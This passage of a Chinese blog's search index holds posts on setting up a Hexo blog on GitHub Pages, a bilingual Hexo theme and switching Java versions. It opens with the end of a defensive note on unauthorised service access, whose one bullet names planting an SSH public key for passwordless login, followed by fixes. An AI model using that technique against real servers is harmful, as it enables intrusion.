<li>写入SSH公钥免密码登录服务器：开放SSH服务，支持密钥登录，具有写入密钥的权限</li>
</ul>
<p>修复方法</p>
<ul>
<li>配置身份认证：修改默认账户名密码 / 配置访问密码</li>
<li>配置访问控制：只允许特定的IP访问</li>
<li>配置绑定IP：如不需要开放外网，则绑定本地IP</li>
<li>修改默认端口：避免端口扫描</li>
<li>权限控制：非root用户启动，没有操作敏感文件的权限</li>
</ul>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
  </entry>
  <entry>
    <title>修改 Hexo 主题生成中英双站</title>
    <url>/zh-CN/config-multilang-blog.html</url>
    <content><![CDATA[<p>终于把 Blog 发布上 Github，接下来想改成支持中英切换的 Blog。</p>
<ol>
<li>中文内容显示在中文Blog，英文内容显示在英文Blog。</li>
<li>菜单随着选择语言的变化而变化。</li>
<li>分类和标签只统计对应语言的。</li>
</ol>
<a id="more"></a>

<h2 id="设置-Hexo-国际化"><a href="#设置-Hexo-国际化" class="headerlink" title="设置 Hexo 国际化"></a>设置 Hexo 国际化</h2><ol>
<li><p>安装 <code>hexo-generator-i18n</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$npm</span> install hexo-generator-i18n --save</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改配置文件 <code>_config.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"></span><br><span class="line"><span class="attr">language:</span> </span><br><span class="line"><span class="bullet">-</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">en</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo-generator-i18n 选项（可选，默认使用如下设置）</span></span><br><span class="line"><span class="attr">i18n:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">[page,</span> <span class="string">post]</span></span><br><span class="line">  <span class="attr">generator:</span> <span class="string">[index,</span> <span class="string">archive,</span> <span class="string">category,</span> <span class="string">tag]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改主题的语言文件 <code>ayer/languages/zh-CN.yml</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index: 主页</span><br><span class="line">categories: 分类</span><br><span class="line">search: 搜索</span><br><span class="line">tags: 标签</span><br><span class="line">tagcloud: 标签云</span><br><span class="line">tweets: 推文</span><br><span class="line">prev: 上一页</span><br><span class="line">next: 下一页</span><br><span class="line">comment: 留言</span><br><span class="line">archives: 归档</span><br><span class="line">archive_a: 归档</span><br><span class="line">archive_b: 归档：%s</span><br><span class="line">page: 第 %d 页</span><br><span class="line">recent_posts: 最新文章</span><br><span class="line">newer: Newer</span><br><span class="line">older: Older</span><br><span class="line">share: 分享</span><br><span class="line">powered_by: Powered by</span><br><span class="line">rss_feed: RSS Feed</span><br><span class="line">category: Category</span><br><span class="line">tag: Tag</span><br><span class="line">about: 关于</span><br><span class="line">share_weixin: 扫一扫分享到微信</span><br></pre></td></tr></table></figure>

<p><strong>有些标签没翻译，之后再改也可以</strong></p>
</li>
</ol>
<h2 id="修改主题的配置文件"><a href="#修改主题的配置文件" class="headerlink" title="修改主题的配置文件"></a>修改主题的配置文件</h2><ol>
<li><p>修改侧边栏</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 侧边栏菜单</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">index:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加语言配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">default_lang:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">langs:</span></span><br><span class="line">  <span class="attr">zh-CN:</span> <span class="string">简体中文</span></span><br><span class="line">  <span class="attr">en:</span> <span class="string">English</span></span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="修改-sidebar-ejs"><a href="#修改-sidebar-ejs" class="headerlink" title="修改 sidebar.ejs"></a>修改 sidebar.ejs</h2><ol>
<li><p><code>url_for</code> 改成 <code>url_for_lang</code> ，生成对应语言的链接。</p>
</li>
<li><p><code>&lt;%= i %&gt;</code> 改成<code>&lt;%= __(i) %&gt;</code>，生成的时候回调用语言文件。</p>
</li>
<li><p>添加菜单栏添加语言按钮，中文的情况下显示 English、英文的情况下显示简体中文。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% for (var i in theme.langs)&#123;</span><br><span class="line">  if (page.lang!&#x3D;i) &#123;</span><br><span class="line">  %&gt;</span><br><span class="line">   </span><br><span class="line">  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">    &lt;% if (theme.default_lang&#x3D;&#x3D;i) &#123; %&gt;</span><br><span class="line">      &lt;a class&#x3D;&quot;nav-item-link&quot; href&#x3D;&quot;&lt;%- url_for(&#39;&#x2F;&#39;) %&gt;&quot;&gt;&lt;%&#x3D; theme.langs[i]%&gt;&lt;&#x2F;a&gt;</span><br><span class="line">      &lt;% &#125; else &#123; %&gt;</span><br><span class="line">    &lt;a class&#x3D;&quot;nav-item-link&quot; href&#x3D;&quot;&lt;%- url_for(i) %&gt;&quot;&gt;&lt;%&#x3D; theme.langs[i]%&gt;&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">   </span><br><span class="line">  &lt;% &#125;&#125; %&gt;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="修改-archive-ejs"><a href="#修改-archive-ejs" class="headerlink" title="修改 archive.ejs"></a>修改 archive.ejs</h2><ol>
<li><p>显示文章的时候，检查该文章是不是当前语言。是的话，显示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% page.posts.each(function(post)&#123; %&gt;</span><br><span class="line">    &lt;%  if (page.lang&#x3D;&#x3D;post.lang)&#123;%&gt;</span><br><span class="line">        &lt;%- partial(&#39;article&#39;, &#123;post: post, index: true&#125;) %&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125;) %&gt;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="修改-categories-ejs"><a href="#修改-categories-ejs" class="headerlink" title="修改 categories.ejs"></a>修改 categories.ejs</h2><ol>
<li><p>只显示当前语言的分类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% site.categories.sort(&#39;name&#39;).each(function(item)&#123; %&gt;</span><br><span class="line">  &lt;% if(item.posts.length)&#123;</span><br><span class="line">      var count &#x3D; 0;</span><br><span class="line">      item.posts.each(function(post)&#123; </span><br><span class="line">         if(post.lang &#x3D;&#x3D; page.lang) &#123; count &#x3D; count + 1; &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      if(count)&#123; %&gt;</span><br><span class="line">    &lt;a class&#x3D;&quot;category-list-link&quot; href&#x3D;&quot;&lt;%- url_for_lang(config.root) %&gt;&lt;%- item.path %&gt;&quot; title&#x3D;&quot;&lt;%&#x3D; item.name %&gt;&quot;&gt;</span><br><span class="line">      &lt;li class&#x3D;&quot;category-list-item&quot;&gt;</span><br><span class="line">      &lt;%&#x3D; item.name %&gt;&lt;i&gt;&lt;%&#x3D; count %&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;a&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">  &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125;); %&gt;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol>
<li>写文章的时候，在文章头部指定语言 lang，就会显示在对应的语言站。</li>
</ol>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">lang: en</span><br><span class="line">date: 2020-02-14 10:10:43</span><br><span class="line">updated: 2020-02-14 10:10:43</span><br><span class="line">categories: </span><br><span class="line">tags:</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>经验分享</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 搭建 Github Blog</title>
    <url>/zh-CN/create-hexo-blog.html</url>
    <content><![CDATA[<p>今年定了目标，就是要好好记录和分享学到的技术。就计划在 Github 维护一个Blog。Github上建 Blog ，常见有三种方式 Jekyll、Hugo、Hexo。之前我用的是 Hexo，就继续用这个，再进行改造。主要有以下任务：</p>
<ol>
<li>配置 Hexo 环境</li>
<li>重新建站</li>
<li>配置主题和主题文件托管</li>
<li>配置 Blog 源文件托管</li>
<li>发布 Blog</li>
</ol>
<p>完成上面基础的步骤之后，再改造主题。</p>
<a id="more"></a>


<h2 id="配置-Hexo-环境"><a href="#配置-Hexo-环境" class="headerlink" title="配置 Hexo 环境"></a>配置 Hexo 环境</h2><ol>
<li><p>安装 Homebrew</p>
</li>
<li><p>安装 Node.js 和 Git</p>
</li>
<li><p>安装 Hexo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
</li>
<li><p>[非初次安装] 更新 node.js 和 Hexo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g n</span><br><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><ol>
<li><p>初始化 Blog 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt; </span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置网站基本信息 <code>_config.yml</code>，主要修改个性化的内容，比如网站标题、作者、语言、时区等。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span>  <span class="comment"># 网站标题</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">''</span> <span class="comment"># 网站副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">''</span> <span class="comment"># 网站描述</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="comment"># 网站关键词</span></span><br><span class="line"><span class="attr">author:</span> <span class="comment"># 作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="comment"># 网站使用的语言</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">zh-CN</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">en</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">'Asia/Shanghai'</span> <span class="comment"># 网站时区</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></span><br><span class="line"><span class="attr">url:</span>  <span class="comment"># 网址</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span> <span class="comment">#网站根目录</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:lang/:title.html</span> <span class="comment"># 文章永久链接格式（支持多语种）</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line">  <span class="attr">lang:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing 'index.html' from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing '.html' from permalinks</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span></span><br><span class="line"><span class="attr">skip_render:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:lang/:title.md</span> <span class="comment"># File name of new posts (支持多语种)</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># Apply to the whole site</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">''</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">''</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>运行 Hexo 查看当前效果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h2 id="配置-Blog-的主题"><a href="#配置-Blog-的主题" class="headerlink" title="配置 Blog 的主题"></a>配置 Blog 的主题</h2><p>需要保存主题文件的修改，还要合并原主题的更新。于是采用<code>git</code>子模块来管理。</p>
<ol>
<li><p>Fork 主题</p>
</li>
<li><p>创建子模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git submodule add https:&#x2F;&#x2F;github.com&#x2F;felicitychou&#x2F;hexo-theme-ayer themes&#x2F;ayer</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 Blog 的配置文件<code>_config.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">ayer</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改主题的配置文件 <code>thems/ayer/_config.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 侧边栏菜单</span></span><br><span class="line"><span class="attr">menu:</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-searchdb --save <span class="comment"># 搜索插件</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看子模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git submodule</span><br></pre></td></tr></table></figure>
</li>
<li><p>同步</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git pull</span><br><span class="line">$ git submodule update</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="创建-Github-Pages-项目"><a href="#创建-Github-Pages-项目" class="headerlink" title="创建 Github Pages 项目"></a>创建 Github Pages 项目</h2><p>登录 github.com，Create a new repository ，命名为 <code>username.github.io</code> </p>
<p><strong>我已经创建过，此步略去</strong></p>
<h2 id="配置「博客」源文件托管"><a href="#配置「博客」源文件托管" class="headerlink" title="配置「博客」源文件托管"></a>配置「博客」源文件托管</h2><p>由于原始文件也需要版本管理，因此我选择存放在同一个项目的不同分支里。</p>
<ol>
<li><p>新建 <code>source</code> 分支</p>
</li>
<li><p>更改仓库的默认分支为 <code>source</code></p>
</li>
<li><p>将本地 Blog 目录与远程仓库关联</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git remote add origin https://github.com/username/username.github.io.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>推送 Blog 源文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add .</span><br><span class="line">$ git commit -m <span class="string">'hexo source post'</span></span><br><span class="line">$ git push origin <span class="built_in">source</span></span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="发布-Blog"><a href="#发布-Blog" class="headerlink" title="发布 Blog"></a>发布 Blog</h2><p>用 Hexo自带的发布功能。</p>
<ol>
<li><p>安装 <a href="https://github.com/hexojs/hexo-deployer-git" target="_blank" rel="noopener">hexo-deployer-git</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 Blog 的配置文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">'git'</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/username/username.github.io</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>发布</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo deploy -g</span><br></pre></td></tr></table></figure>




</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p>Hexo官方文档 <a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a> </p>
</li>
<li><p>Ayer中文说明 <a href="https://shen-yu.gitee.io/2019/ayer/" target="_blank" rel="noopener">https://shen-yu.gitee.io/2019/ayer/</a></p>
</li>
<li><p>Github Pages 官方指引 <a href="https://pages.github.com/" target="_blank" rel="noopener">https://pages.github.com/</a></p>
</li>
<li><p>Hexo静态博客的文章源码和主题代码管理 <a href="http://www.neilron.xyz/hexo-blog-source-code-management/" target="_blank" rel="noopener">http://www.neilron.xyz/hexo-blog-source-code-management/</a></p>
</li>
<li><p>使用git分支保存hexo博客源码到github <a href="https://www.jianshu.com/p/8814ce1da7a4" target="_blank" rel="noopener">https://www.jianshu.com/p/8814ce1da7a4</a></p>
</li>
<li><p>hexo使用git子模块来管理theme <a href="https://xiongyingqi.com/2019/02/01/use-git-submodules/" target="_blank" rel="noopener">https://xiongyingqi.com/2019/02/01/use-git-submodules/</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>经验分享</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 多版本共存与切换</title>
    <url>/zh-CN/java-multi-version.html</url>
    <content><![CDATA[<p>原本我电脑只装了 Java 9，现在需要装 Java 8。</p>
<a id="more"></a>

<ol>
<li><p>下载  Java SE 8u241</p>
<p><strong>需要登录 oracle 才能下载。没有账号的话，先注册一个。</strong></p>
<p><a href="https://www.oracle.com/java/technologies/javase-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase-downloads.html</a></p>
</li>
<li><p>安装 Java SE 8u241。安装后，查看已安装的 Java 版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/libexec/java_home -V</span><br></pre></td></tr></table></figure>

<p><img src="/zh-CN/java-multi-version/image-20200215135123596.png" alt="image-20200215135123596"></p>
</li>
<li><p>在<code>.bash_profile</code> 中，设置Java版本切换的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_8_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home</span><br><span class="line"><span class="built_in">export</span> JAVA_9_HOME=/Library/Java/JavaVirtualMachines/jdk-9.0.1.jdk/Contents/Home</span><br><span class="line"><span class="built_in">alias</span> jdk8=<span class="string">"export JAVA_HOME=<span class="variable">$JAVA_8_HOME</span>"</span> </span><br><span class="line"><span class="built_in">alias</span> jdk9=<span class="string">"export JAVA_HOME=<span class="variable">$JAVA_9_HOME</span>"</span> </span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=`/usr/libexec/java_home`</span><br></pre></td></tr></table></figure>
</li>
<li><p>查询当前 Java版本，如果需要其他版本就输入切换命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ java -version</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>参考</p>
<blockquote>
<p><a href="https://blog.csdn.net/gljazzgljazz/article/details/99953327" target="_blank" rel="noopener">在macOS中同时安装jdk8、jdk9、jdk11、jdk12并自由切换</a></p>
</blockquote>
]]></content>
      <categories>
        <category>使用技巧</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/en/hello-world.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
</search>
